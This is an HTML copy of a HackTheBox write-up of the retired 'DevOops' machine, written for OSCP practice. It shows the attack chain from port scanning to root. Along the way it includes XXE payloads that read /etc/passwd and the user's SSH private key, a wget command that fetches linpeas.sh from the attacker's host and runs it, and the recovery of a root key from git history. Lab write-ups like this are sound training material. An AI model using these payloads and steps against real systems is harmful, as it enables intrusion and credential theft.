<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://kaizoku.dev/htb-devoops">Original</a>
    <h1>A pentester gets root - step by step example</h1>
    
    <div id="readability-page-1" class="page"><div id="post-content-wrapper">
<p> <a target="_blank" href="https://app.hackthebox.com/machines/DevOops/">DevOops</a>  is a Medium-rated retired machine on HackTheBox, and also appears on the  <a target="_blank" href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159">TJ Null list for OSCP prep</a>.</p>


<p>We begin with a basic TCP/ UDP ports scan. </p>
<h3 id="heading-tcp-udp-ports-scan-and-service-enumeration">TCP/ UDP Ports Scan and Service Enumeration</h3>
<pre><code>
nmap -Pn -sT -p- --min-rate 10000 \
-oN nmap/tcp_ports_scan <span>$IP</span>







nmap --privileged -Pn -sU -p- --min-rate 10000 \
-oN nmap/udp_ports_scan <span>$IP</span>


</code></pre>
<p>No UDP ports are open. Now, we perform service enumeration, version detection, and script scan on the open TCP ports.</p>
<pre><code>
nmap -Pn -sT -A -p 22,5000,50627 -oN nmap/tcp_script_scan <span>$IP</span>





</code></pre>
<h3 id="heading-further-discovery-and-vulnerability-assessment">Further Discovery and Vulnerability Assessment</h3>
<p>With the services and their versions at hand, we can search for any available exploits using searchsploit.</p>
<pre><code>searchsploit openssh 7.2


searchsploit gunicorn

</code></pre>
<p>Even upon further googling, we do not see any off-the-shelf exploits for these services.</p>
<p>There is a website running on port 5000. Let&#39;s check for some common directories.</p>
<pre><code>ffuf -u http://<span>$IP</span>:5000/FUZZ -w <span>$COMMON_DIRS</span> -e .php,.txt,.html \
-t 500 -ic -rate 1000 -r -c | tee ffuf/common_dirs.txt





ffuf -u http://<span>$IP</span>:5000/FUZZ -w <span>$MEDIUM_DIRS</span> -e .php,.txt,.html \
-t 500 -ic -rate 1000 -r -c | tee ffuf/medium_dirs.txt



</code></pre>
<p>In <a href="http://10.10.10.91:5000/upload" target="_blank">10.10.10.91:5000/upload</a>, we can upload XML files with the elements - Author, Subject, Content</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1638597565834/vrULjoZI2.png?auto=compress,format&amp;format=webp" alt="2021-12-04_11-27.png"/></p>
<p>Let&#39;s create a sample <code>abc.xml</code> file as follows and upload it.</p>
<pre><code><span>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
<span>&lt;<span>Book</span>&gt;</span>
    <span>&lt;<span>Author</span>&gt;</span>Frank<span>&lt;/<span>Author</span>&gt;</span>
    <span>&lt;<span>Subject</span>&gt;</span>SciFi<span>&lt;/<span>Subject</span>&gt;</span>
    <span>&lt;<span>Content</span>&gt;</span>Dune<span>&lt;/<span>Content</span>&gt;</span>
<span>&lt;/<span>Book</span>&gt;</span>
</code></pre>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1638597554998/Q9NDoqbvQ.png?auto=compress,format&amp;format=webp" alt="2021-12-04_11-28.png"/>
This direction seems promising. We have a dump of new info -</p>
<ul>
<li>the server has a user called <code>roosa</code></li>
<li>abc.xml has been uploaded to <code>/home/roosa/deploy/src</code> on the server, and can now be accessed at <a href="http://10.10.10.91:5000/uploads/abc.xml" target="_blank">10.10.10.91:5000/uploads/abc.xml</a></li>
</ul>
<p>As expected, <code>abc.xml</code> is available at <a href="http://10.10.10.91:5000/uploads/abc.xml" target="_blank">10.10.10.91:5000/uploads/abc.xml</a></p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1638597927088/9tNRpGm5s.png?auto=compress,format&amp;format=webp" alt="2021-12-04_11-34.png"/></p>
<p>As soon as we see XML, the embers of XXE ignite in our hearts. Let&#39;s fan those embers into flames. If you don&#39;t know what XXE injection is, please check out this post - <a href="https://portswigger.net/web-security/xxe" target="_blank">portswigger.net/web-security/xxe</a>.</p>
<p>Let&#39;s create a <code>passwd.xml</code> as follows and upload it.</p>
<pre><code><span>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
<span>&lt;!DOCTYPE <span>foo</span> [ <span>&lt;!ENTITY <span>xxe</span> <span>SYSTEM</span> <span>&#34;file:///etc/passwd&#34;</span>&gt;</span> ]&gt;</span>
<span>&lt;<span>Book</span>&gt;</span>
    <span>&lt;<span>Author</span>&gt;</span>Frank<span>&lt;/<span>Author</span>&gt;</span>
    <span>&lt;<span>Subject</span>&gt;</span>SciFi<span>&lt;/<span>Subject</span>&gt;</span>
    <span>&lt;<span>Content</span>&gt;</span><span>&amp;xxe;</span><span>&lt;/<span>Content</span>&gt;</span>
<span>&lt;/<span>Book</span>&gt;</span>
</code></pre>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1638598471395/2I4m8OkAe.png?auto=compress,format&amp;format=webp" alt="2021-12-04_11-43.png"/></p>
<p>Bingo! Now, that&#39;s the XXE injection we all know and love.
It&#39;s cropped in the image above, but if we scroll down, we will find an entry for <code>roosa</code> in <code>/etc/passwd</code> -
<code>roosa:x:1002:1002:,,,:/home/roosa:/bin/bash</code></p>

<hr/>

<p><strong>Now that we know XXE works, I&#39;d highly suggest you to give a sincere shot at getting to the user shell on your own before proceeding further with this write-up.</strong></p>
<p><strong>The fruits of one&#39;s own work are always the sweetest.</strong></p>
<hr/>


<h3 id="heading-enumeration">Enumeration</h3>
<p>Since we are able to read files on the server, let&#39;s be a little ambitious and try to read files from roosa&#39;s home directory. Since the SSH port was open, roosa&#39;s id_rsa private key file seems like a good target. Let&#39;s try reading the following files - </p>
<ul>
<li><code>/home/roosa/user.txt</code></li>
<li><code>/home/roosa/.ssh/id_rsa</code></li>
</ul>
<p>We can exfiltrate both of them with <code>user.xml</code> and <code>id_rsa.xml</code> as shown below. All you need to do is change <code>/etc/passwd</code> to the respective user.txt and id_rsa paths.</p>
<pre><code><span>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
<span>&lt;!DOCTYPE <span>foo</span> [ <span>&lt;!ENTITY <span>xxe</span> <span>SYSTEM</span> <span>&#34;file:///home/roosa/user.txt&#34;</span>&gt;</span> ]&gt;</span>
<span>&lt;<span>Book</span>&gt;</span>
    <span>&lt;<span>Author</span>&gt;</span>Frank<span>&lt;/<span>Author</span>&gt;</span>
    <span>&lt;<span>Subject</span>&gt;</span>SciFi<span>&lt;/<span>Subject</span>&gt;</span>
    <span>&lt;<span>Content</span>&gt;</span><span>&amp;xxe;</span><span>&lt;/<span>Content</span>&gt;</span>
<span>&lt;/<span>Book</span>&gt;</span>
</code></pre>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1638599645573/KtZe6SEyd.png?auto=compress,format&amp;format=webp" alt="2021-12-04_12-02.png"/></p>
<pre><code><span>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
<span>&lt;!DOCTYPE <span>foo</span> [ <span>&lt;!ENTITY <span>xxe</span> <span>SYSTEM</span> <span>&#34;file:///home/roosa/.ssh/id_rsa&#34;</span>&gt;</span> ]&gt;</span>
<span>&lt;<span>Book</span>&gt;</span>
    <span>&lt;<span>Author</span>&gt;</span>Frank<span>&lt;/<span>Author</span>&gt;</span>
    <span>&lt;<span>Subject</span>&gt;</span>SciFi<span>&lt;/<span>Subject</span>&gt;</span>
    <span>&lt;<span>Content</span>&gt;</span><span>&amp;xxe;</span><span>&lt;/<span>Content</span>&gt;</span>
<span>&lt;/<span>Book</span>&gt;</span>
</code></pre>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1638599655831/gQht33GeT.png?auto=compress,format&amp;format=webp" alt="2021-12-04_12-03.png"/></p>
<p>Naaice! We got roosa&#39;s ssh private key. Let&#39;s copy it into a file on our local machine - <code>roosa_id_rsa</code></p>
<h3 id="heading-exploitation">Exploitation</h3>
<pre><code>
chmod 600 roosa_id_rsa
ssh -i roosa_id_rsa roosa@<span>$ip</span>
</code></pre>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1638602346976/2fw2r12Ej.png?auto=compress,format&amp;format=webp" alt="Screenshot from 2021-12-04 12-48-42.png"/></p>


<h3 id="heading-enumeration">Enumeration</h3>
<p>Let&#39;s start a HTTP server on our local machine to host useful binaries &amp; scripts like <a href="http://linpeas.sh" target="_blank">linpeas.sh</a> which we will download and run on the DevOops server.</p>
<pre><code>
python3 -m http.server 1337 --directory=/home/bob/Code/HTB/bins


roosa@gitter:/tmp$  <span>cd</span> /tmp; 
roosa@gitter:/tmp$  wget http://10.10.15.15:1337/linux/privesc/linpeas.sh; 
roosa@gitter:/tmp$  chmod +x linpeas.sh; 
roosa@gitter:/tmp$  ./linpeas.sh &gt; linpeas.txt &amp;
</code></pre>
<p>Let&#39;s look at only the most interesting pieces of linpeas output.</p>
<pre><code>

tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
</code></pre>
<p>Port 631 is used by Internet Printing Protocol (IPP). From experience, it&#39;s not a great attack vector for privilege escalation. Still, noted.</p>
<pre><code>
PermitRootLogin prohibit-password                                        
PubkeyAuthentication yes                                                                                                                          
PermitEmptyPasswords no
</code></pre>
<p>This attack vector seems promising. We need to be on the lookout for root&#39;s ssh private key.</p>
<pre><code>
/home/roosa/deploy/resources/integration/authcredentials.key
/home/roosa/work/blogfeed/resources/integration/authcredentials.key
/home/roosa/work/blogfeed/.git


roosa@gitter:~$ cat /home/roosa/deploy/resources/integration/authcredentials.key
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
.
.
.
T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
-----END RSA PRIVATE KEY-----


roosa@gitter:~$ cat /home/roosa/work/blogfeed/resources/integration/authcredentials.key                                                           
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
.
.
.
T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
-----END RSA PRIVATE KEY-----
</code></pre>
<p>Both of them are identical and could be root&#39;s ssh private key. Let&#39;s create a <code>root_id_rsa</code> file and try logging in as root via ssh. </p>
<pre><code>
chmod 600 root_id_rsa
ssh -i root_id_rsa root@<span>$ip</span>
</code></pre>
<p>Nada! That didn&#39;t work. It prompts for a root password despite supplying the ssh private key.</p>

<hr/>

<p><strong>Now that root ssh login seems likely, I&#39;d highly suggest you to give a sincere shot at getting to the root shell on your own before proceeding further with this write-up.</strong></p>
<p><strong>The fruits of one&#39;s own work are always the sweetest.</strong></p>
<hr/>

<p><code>/home/roosa/work/blogfeed/</code> seems to be a git repository since it has a <code>.git</code> directory. Let&#39;s take a look at the commit history for interesting files from the past.</p>
<pre><code>roosa@gitter:~/work/blogfeed$ git <span>log</span>

commit 7ff507d029021b0915235ff91e6a74ba33009c6d
Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
Date:   Mon Mar 26 06:13:55 2018 -0400

    Use Base64 <span>for</span> pickle feed loading

commit 26ae6c8668995b2f09bf9e2809c36b156207bfa8
Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
Date:   Tue Mar 20 15:37:00 2018 -0400

    Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.

commit cec54d8cb6117fd7f164db142f0348a74d3e9a70
Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
Date:   Tue Mar 20 15:08:09 2018 -0400

    Debug support added to make development more agile.

commit ca3e768f2434511e75bd5137593895bd38e1b1c2
Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
Date:   Tue Mar 20 08:38:21 2018 -0400

    Blogfeed app, initial version.

commit dfebfdfd9146c98432d19e3f7d83cc5f3adbfe94
Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
Date:   Tue Mar 20 08:37:56 2018 -0400

    Gunicorn startup script

commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
Date:   Mon Mar 19 09:33:06 2018 -0400

    reverted accidental commit with proper key

commit d387abf63e05c9628a59195cec9311751bdb283f
Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
Date:   Mon Mar 19 09:32:03 2018 -0400

    add key <span>for</span> feed integration from tnerprise backend

commit 1422e5a04d1b52a44e6dc81023420347e257ee5f
Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
Date:   Mon Mar 19 09:24:30 2018 -0400

    Initial commit
</code></pre>
<p>The commit message for commit <code>33e87c312c08735a02fa9c796021a4a3023129ad</code> reads &#39; reverted accidental commit with proper key&#39;.  Let&#39;s look at the <code>authcredentials.key</code> file in that commit.</p>
<pre><code>roosa@gitter:~/work/blogfeed$ git show 33e87c312c08735a02fa9c796021a4a3023129ad:./resources/integration/authcredentials.key

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
.
.
.
T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
-----END RSA PRIVATE KEY-----
</code></pre>
<p>It&#39;s the same &#39;fake&#39; private key we found earlier. If this commit &#39;reverted accidental commit with proper key&#39;, let&#39;s look at the <code>authcredentials.key</code> file in the previous commit <code>d387abf63e05c9628a59195cec9311751bdb283f</code> </p>
<pre><code>roosa@gitter:~/work/blogfeed$ git show d387abf63e05c9628a59195cec9311751bdb283f:./resources/integration/authcredentials.key
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
.
.
.
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----
</code></pre>
<p>This private key is different. Let&#39;s load it up into <code>root_id_rsa</code> and try again.</p>
<h3 id="heading-exploitation">Exploitation</h3>
<pre><code>ssh -i root_id_rsa root@<span>$ip</span>
</code></pre>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1638615439766/oS7UiFUAQ.png?auto=compress,format&amp;format=webp" alt="Screenshot from 2021-12-04 16-26-53.png"/></p>
<h3 id="heading-fin"><em>Fin!</em></h3>


<p>Normally, we use sudo when running an nmap UDP scan or some custom TCP scans since they require permissions to listen on the network interface, craft raw packets, etc. But, using sudo always is not ideal. Instead we can grant the exact capabilities required to the nmap binary so as to not use sudo each time.</p>
<pre><code>sudo <span>setcap</span> cap_net_raw,cap_net_admin,cap_net_bind_service+eip $(<span>which</span> nmap)
</code></pre>
</div></div>
  </body>
</html>
